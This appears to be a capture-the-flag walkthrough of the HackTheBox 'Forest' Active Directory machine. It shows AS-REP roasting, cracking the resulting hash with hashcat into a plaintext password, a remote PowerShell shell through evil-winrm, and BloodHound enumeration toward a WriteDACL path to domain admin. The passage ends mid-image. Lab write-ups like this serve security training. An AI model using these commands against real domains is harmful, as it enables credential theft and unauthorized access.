<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ GetNPUsers.py -no-pass -usersfile users htb.local/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...&lt;snip&gt;...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$krb5asrep$23$svc-alfresco@HTB.LOCAL:4b5ea29c3842acb8465919a662db874f$27c770bf5d0811a77b0525c9d323d98356c526627aa929d89439c119fa8611bf1f6780a27a1a1d4aeadec03bb980a6f91bd3a5d3fde824270400be3a27b8e2c897b957dbf2847e137e4f47fe3288bede141d76eaa60c102671579ebeb7afda66c7114b9c46d6572f58f7029d572e6e3bc66a3fa2e9416ad6b1c7553c57af9715310dd9d57530ee89b2555f8556b657abca479bedcb124aaa5bd980c44f17d98dbe18b0e5bbbca1bdc1852fd60944d114d4a15789ae06ede265600a8091878f0e638301f75f1635262fb416025383411db1ae12e3b9fa318ac6253fe619638266dc7febfb93ad</span><br></span></code></pre></div></div>
<p>first i identify the hash mode with hashcat</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo hashcat --identify hash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The following hash-mode match the structure of your input hash:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      # | Name                                                       | Category</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ======+============================================================+======================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol</span><br></span></code></pre></div></div>
<p>then I crack the hash using the kerberos 5 mode</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...&lt;snip&gt;...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$krb5asrep$23$svc-alfresco@HTB.LOCAL:4b5ea29c3842acb8465919a662db874f$27c770bf5d0811a77b0525c9d323d98356c526627aa929d89439c119fa8611bf1f6780a27a1a1d4aeadec03bb980a6f91bd3a5d3fde824270400be3a27b8e2c897b957dbf2847e137e4f47fe3288bede141d76eaa60c102671579ebeb7afda66c7114b9c46d6572f58f7029d572e6e3bc66a3fa2e9416ad6b1c7553c57af9715310dd9d57530ee89b2555f8556b657abca479bedcb124aaa5bd980c44f17d98dbe18b0e5bbbca1bdc1852fd60944d114d4a15789ae06ede265600a8091878f0e638301f75f1635262fb416025383411db1ae12e3b9fa318ac6253fe619638266dc7febfb93ad:s3rvice</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...&lt;snip&gt;...</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="access-through-evil-winrm">access through evil-winrm<a href="#access-through-evil-winrm" class="hash-link" aria-label="Direct link to access through evil-winrm" title="Direct link to access through evil-winrm" translate="no">​</a></h3>
<p>with crackmapexec I verify if the credentials are valid for a winrm session and it confirms it is with a pwned message</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)</span><br></span></code></pre></div></div>
<p>using evil-winrm I am able to obtain a powershell session on the target machine as user svc-alfresco and I am able to read the user flag</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; type C:\Users\svc-alfresco\Desktop\user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0c2697dca35c...</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="shell-as-administrator">shell as administrator<a href="#shell-as-administrator" class="hash-link" aria-label="Direct link to shell as administrator" title="Direct link to shell as administrator" translate="no">​</a></h2>
<p>given that this is an active directory machine I will make use of bloodhound to find a way to become administrator</p>
<p>I will copy the built-in sharphound.exe from bloodhound to the directory where I started the evil-winrm session</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .</span><br></span></code></pre></div></div>
<p>I start the neo4j console to make bloodhound functional</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo neo4j console</span><br></span></code></pre></div></div>
<p>then I launch bloodhound and connect to neo4j using my credentials (the default neo4j credentials are neo4j<!-- -->:neo4j<!-- -->).</p>
<p>on the evil-winrm session I upload SharpHound.exe to the machine</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; upload SharpHound.exe                                     </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Uploading /home/linux/Desktop/forest/content/SharpHound.exe to C:\Users\svc-alfresco\Desktop\bh\SharpHound.exe</span><br></span></code></pre></div></div>
<p>using sharphound I start the collection method for &quot;All&quot;</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; .\SharpHound.exe -c All</span><br></span></code></pre></div></div>
<p>after it finishes collecting the data I download the zipped file to my machine</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh&gt; download 20240915111107_BloodHound.zip /home/linux/Desktop/forest/content/data.zip</span><br></span></code></pre></div></div>
<p>and I upload the data to bloodhound</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="295" height="294" class="img_ev3q"></p>
<p>I select the option of &quot;shortest paths to high value targets&quot; for the domain HTB.LOCAL</p>
<p><img decoding="async" loading="lazy" src="/assets/images/options-7659eb8879fd282d9ffb45ee0fd86365.png" width="977" height="627" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-paths-to-domain-admin">finding paths to domain admin<a href="#finding-paths-to-domain-admin" class="hash-link" aria-label="Direct link to finding paths to domain admin" title="Direct link to finding paths to domain admin" translate="no">​</a></h3>
<p>here I find a graphic representation of a path to become a domain admin from  the user svc-alfresco</p>
<p><img decoding="async" loading="lazy" src="/assets/images/path1-78ca7e31a0db70dc532e60a51c253452.png" width="1159" height="284" class="img_ev3q"></p>
<p>to find a more descriptive way I filter by the user svc-alfresco in the search bar (to add the skull do right click &gt; mark user as owned)</p>
<p><img decoding="async" loading="lazy" src="/assets/images/search1-8e96dd77b9340608a15a3d82c6a9c40b.png" width="499" height="252" class="img_ev3q"></p>
<p>to view a new graph I click on the svc-alfresco node and in the node info tab I click on reachable high value targets</p>
<p><img decoding="async" loading="lazy" src="/assets/images/node1-94ef33cba6d91da6735d99b1b8355371.png" width="1003" height="523" class="img_ev3q"></p>
<p>I find that this user is part of an account operators group
<img decoding="async" loading="lazy" src="/assets/images/path2-912ebf8b9090b318accef170f94f7993.png" width="972" height="239" class="img_ev3q"></p>
<p>clicking on this node and viewing the high reachable targets I find another interesting path, that this user can perform a &quot;writedacl&quot; on the htb.local domain</p>
<p><img decoding="async" loading="lazy" src="/assets/images/node2-bea507e51fba3e5d2835adf364be6693.png" width="1476" height="424" class="img_ev3q"></p>
<p>I click on help to view more information about this privilege</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAADrCAIAAADYJoydAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAddUlEQVR4nO2dd0AT1x/Av5cFYQgqey9liqKIe1ete1TrXnXbulfr3qOuumprW2e1avWn1L3qap0oILhli1UQZIQVk9zvj0uOSwg7AfP8flB4eXl393L3uW++9+6SowJDWgOCkAKvujuAILoEhUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRogChUaIAoVGiAKFRoiCQKG7dOowb/Z0prz3l+0hwQ0BwMnR4eCendxmG9cs93Bztbez7fRZO63z2bBm2aXTx86FHtn10xY3V5eyLHrcV8MH9e9bue4jlYJAoaMePQnw8wEAY2NjLw/34IYNAMDP1zvq0WO2DUVRC5eviY1PsLO16VyM0ACwYOmqz3t9+fNve9evXsrn86ug80glIVDoV8mvraxqC4XCoMCAC5evBNWvBwD+vt5R0Y/bt2l1cM/Ok0cPBPj5blq7vHXL5vPnzghuGDRx7CgAaNOq+dGDu48f2turexfuDO/cux8TG9ekcSOBQLBqyfzjh/cd2vdLHU8PAPBwd/t9147jh/d9O2tqtbxYRAMChQaA5y9e1vH0aBwc9Pe1f0RCoUgk9Pf1iXr0BABkMlnvAcOZaP36v/9Wrt0Y9iB8xy+7TcTiiWNHDRs9ceCIceO+Gi4WG3NnGBMb7+ri5OLsFBYe2WfA8O0/7xoxdCAALJg7Y/3mH/sOHGFjZdU0pFG1vFiEi6C6O6AXHj564u/n0yCw3m97DjxsFBQY4O/oYJ+Y9MrT3e3Fyxi5XF50Ej9fb0cH+72/bAcAPp9vY22t9jRFAUBcfEKnDm1/2rLexMQkKyuLx+M5OTpEREYBwPylKxUKOjDA